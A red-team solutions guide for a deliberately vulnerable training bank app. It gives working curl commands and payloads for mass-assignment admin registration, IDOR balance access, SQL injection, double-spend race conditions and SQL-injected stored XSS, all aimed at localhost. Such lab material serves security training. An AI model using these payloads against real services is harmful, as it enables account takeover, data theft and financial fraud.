# Vulnerable Bank - Red Team Solutions Guide

This guide details how to exploit the known vulnerabilities in the Vulnerable Bank application.

## 1. Mass Assignment (Privilege Escalation)
**Difficulty:** Easy
**Target:** Auth Service (`POST /register`)

### Analysis
The `UserCreate` model accepts an `is_admin` field. API accepts this field, allowing users to register as administrators.

### Exploit
Send a JSON payload during registration with `"is_admin": true`.

```bash
curl -X POST http://localhost/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "123", "is_admin": true}'
```

**Verification:**
Login and inspect the JWT. It will contain `"admin": true`.

## 2. Information Disclosure (IDOR)
**Difficulty:** Easy
**Target:** Ledger Service (`GET /ledger/balance/{account_id}`)

### Analysis
The `get_balance` endpoint takes an `account_id` path parameter but does not verify that the authenticated user owns that account.

### Exploit
Iterate through Account IDs. CEO's account is usually ID `1`.

```bash
curl http://localhost/ledger/balance/1 \
  -H "Authorization: Bearer <YOUR_TOKEN>"
```

**Result:**
The API returns the balance for Account 1.

## 3. SQL Injection (Data Exfiltration)
**Difficulty:** Medium
**Target:** Ledger Service (`GET /ledger/transactions/search`)

### Analysis
The transaction search functionality uses an f-string to construct the SQL query.

### Exploit
Inject a payload to dump all transactions.

**Payload:** `' OR '1'='1`
```bash
curl "http://localhost/ledger/transactions/search?q='%20OR%20'1'='1" \
  -H "Authorization: Bearer <YOUR_TOKEN>"
```

**Result:**
Returns all transactions, including hidden ones.

## 4. Race Condition (Double Spending)
**Difficulty:** Hard
**Target:** Transaction Worker

### Analysis
Worker checks sender's balance, sleeps 5s, then deducts amount. Parallel requests exploit this window.

### Exploit
1. Ensure you have funds ($100).
2. Send two transfer requests for $100 simultaneously.

**Result:**
Both transfers succeed, resulting in negative balance.

## 5. Stored XSS
**Difficulty:** Medium/Hard
**Target:** Frontend Dashboard & Ledger Service

### Analysis
Frontend renders descriptions using `dangerouslySetInnerHTML`. Ledger allows SQL Injection to insert fake records.

### Exploit
1. Use SQL Injection to inject a fake transaction with a malicious payload.
2. **Payload:** `' UNION SELECT 9999, 1, 0, '<img src=x onerror=alert("XSS")>', NOW() --`
3. Visit Dashboard.

**Result:**
The malicious HTML is rendered.
